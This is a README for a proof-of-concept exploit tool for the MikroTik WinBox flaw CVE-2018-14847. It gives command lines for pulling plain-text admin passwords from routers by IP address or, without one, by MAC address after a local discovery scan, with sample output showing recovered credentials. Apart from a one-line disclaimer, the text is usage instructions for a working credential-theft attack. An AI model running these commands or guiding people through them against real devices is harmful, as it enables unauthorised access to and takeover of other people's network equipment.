# please this was created by John , and shouldn't be used for any opposite intentions

# WinboxExploit
This is a proof of concept of the critical WinBox vulnerability (CVE-2018-14847) which allows for arbitrary file read of plain text passwords.





## Requirements
- Python 3+

This script will NOT run with Python 2.x or lower.

## How To Use
The script is simple used with simple arguments in the commandline.

#### WinBox (TCP/IP)
Exploit the vulnerability and read the password.
```
python3 WinboxExploit.py <IP-ADDRESS> [PORT]
```
Example:
```
$ python3 WinboxExploit.py 172.17.17.17
Connected to 172.17.17.17:8291

Exploit successful
User: admin
Pass: Th3P4ssWord
```

#### MAC server WinBox (Layer 2)  
You can extract files even if the device doesn't have an IP address.

Simple discovery check for locally connected Mikrotik devices.
```
python3 MACServerDiscover.py
```
Example:
```
$ python3 MACServerDiscover.py
Looking for Mikrotik devices (MAC servers)

    aa:bb:cc:dd:ee:ff 

    aa:bb:cc:dd:ee:aa
```

Exploit the vulnerability and read the password.
```
python3 MACServerExploit.py <MAC-ADDRESS>
```
Example:
```
$ python3 MACServerExploit.py aa:bb:cc:dd:ee:ff

User: admin
Pass: Th3P4ssWord
```




